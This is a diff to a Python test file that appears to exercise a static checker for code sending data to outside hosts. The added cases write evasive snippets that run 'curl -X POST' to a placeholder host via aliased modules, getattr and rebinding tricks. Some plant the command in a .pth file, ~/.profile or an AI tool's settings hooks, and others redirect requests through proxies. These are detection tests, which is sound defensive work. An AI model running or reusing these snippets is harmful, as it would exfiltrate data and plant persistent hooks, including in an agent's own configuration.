@@ -162,6 +162,45 @@ FIRES = {
         "from pathlib import Path\n"
         f"Path('x.txt').write_text('curl -X POST https://{B}')\nPath('x.txt').rename('/home/me/.profile')"
     ),
+    # a local module used as a value, or reached by name
+    "a local module passed around": f"import glob\ng = glob\ng.os.system('curl -X POST https://{B}')",
+    "getattr on a local module": f"import glob\ngetattr(glob, 'os').system('curl -X POST https://{B}')",
+    "a module handed to a function": (
+        f"import glob\ndef f(m):\n    return m.os\nf(glob).system('curl -X POST https://{B}')"
+    ),
+    # a binding that may not run, or runs after the read
+    "bound in a with body": (
+        "import contextlib\nwith contextlib.suppress(Exception):\n    1 / 0\n    terminal = print\n"
+        f"terminal('curl -X POST https://{B}')"
+    ),
+    "bound by a walrus on a branch": (
+        f"False and (terminal := print)\nterminal('curl -X POST https://{B}')"
+    ),
+    "a function called before its global is bound": (
+        f"def g():\n    terminal('curl -X POST https://{B}')\ng()\nterminal = print"
+    ),
+    "a method reading a class-body name": (
+        "class K:\n    terminal = print\n    def m(self):\n"
+        f"        terminal('curl -X POST https://{B}')\nK().m()"
+    ),
+    "augmented assignment reads first": (
+        f"terminal += []\nterminal[0]('curl -X POST https://{B}')"
+    ),
+    "a deleted name": f"terminal = print\ndel terminal\nterminal('curl -X POST https://{B}')",
+    # writes the mode or constructor of which this reading does not follow
+    "open mode by keywords": (
+        f"open('/tmp/x.txt', **{{'mode': 'a'}}).write('curl -X POST https://{B}')"
+    ),
+    "open by star-args": f"open(*['/tmp/x.txt', 'a']).write('curl -X POST https://{B}')",
+    "a temporary .pth file": (
+        "import tempfile\n"
+        f"tempfile.NamedTemporaryFile('w', suffix='.pth').write('curl https://{B}')"
+    ),
+    "a json file a tool reads settings from": (
+        "import json, os\n"
+        f"json.dump({{'hooks': 'curl -X POST https://{B}'}}, "
+        "open(os.path.expanduser('~/.claude/settings.json'), 'w'))"
+    ),
     "globals swapping a module": (
         f"import json\nimport subprocess as s\nglobals()['json'] = s\njson.run('curl https://{B}')"
     ),
@@ -192,7 +231,7 @@ def test_code_with_a_sink_keeps_the_text_reading(monkeypatch, code):
 def test_data_files_written_by_local_code_stay_local():
     code = (
         "import json\n"
-        "D = '/home/me/.cache/scratch/'\n"
+        "D = '/tmp/scratch/'\n"
         f"rows = {{'a': 'curl -X POST https://{B}/v1'}}\n"
         "json.dump(rows, open(D + 'rows.json', 'w'))\n"
         "for k in rows:\n"
@@ -343,6 +382,16 @@ def test_request_targets_are_the_only_destinations(code, targets):
         f"requests.post('https://{A}/x', data='1')",
         f"import requests\ns = requests.Session()\ns.proxies = {{'https': 'http://{B}'}}\n"
         f"s.post('https://{A}/x')",
+        f"import urllib.request\nr = urllib.request.Request('https://{A}/x')\n"
+        f"setattr(r, 'full_url', 'https://{B}/x')\nurllib.request.urlopen(r)",
+        f"import requests\ns = requests.Session()\ns.proxies.update({{'https': 'http://{B}'}})\n"
+        f"s.post('https://{A}/x')",
+        f"import requests\ns = requests.Session()\ns.proxies['https'] = 'http://{B}'\n"
+        f"s.post('https://{A}/x')",
+        f"import requests\nkw = {{'proxies': {{'https': 'http://{B}'}}}}\n"
+        f"requests.post('https://{A}/x', **kw)",
+        "from urllib.request import ProxyHandler as P, build_opener as O, install_opener as I, urlopen\n"
+        f"I(O(P({{'https': 'http://{B}'}})))\nurlopen('https://{A}/x')",
         # a request call this reading does not list, beside one it does
         f"import urllib.request\nurllib.request.urlopen('https://{A}/x')\n"
         f"urllib.request.URLopener().open('https://{B}/?d=1')",
